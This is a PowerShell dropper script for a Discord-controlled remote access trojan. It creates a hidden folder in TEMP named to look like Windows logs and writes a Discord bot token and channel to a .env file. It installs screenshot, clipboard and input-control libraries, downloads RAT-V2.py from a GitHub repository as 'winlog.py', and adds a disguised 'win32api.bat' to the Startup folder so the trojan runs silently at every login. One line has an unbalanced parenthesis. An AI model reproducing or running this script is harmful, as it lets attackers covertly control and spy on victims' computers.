Set-Location $env:TEMP
New-Item -ItemType Directory -Path win32logs -Force
Set-Location win32logs

New-Item -Path .env -Force
Add-Content -Value ("DISCORD_TOKEN=$dc", "CHANNEL=$ch" -Path .env

python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org Pillow pyperclip discord.py[voice] requests pyautogui python-dotenv --user

Invoke-WebRequest -Uri https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/RAT-V2.py -OutFile winlog.py

New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win32api.bat" -Force
'@echo off', 'start /B pythonw.exe "%TEMP%\win32logs\winlog.py"' | Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win32api.bat"

python winlog.py
